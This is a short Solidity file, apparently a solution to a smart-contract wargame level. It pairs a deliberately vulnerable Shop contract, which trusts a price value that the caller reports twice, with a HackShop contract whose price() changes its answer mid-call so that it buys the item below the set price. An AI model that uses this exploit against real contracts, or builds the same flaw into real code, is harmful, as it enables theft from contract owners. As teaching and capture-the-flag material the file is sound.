// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract HackShop {
    function price() public view returns (uint) {
        return IShop(msg.sender).isSold() ? 1 : 101;
    }

    function hack(address _victim) public {
        IShop(_victim).buy();
    }
}
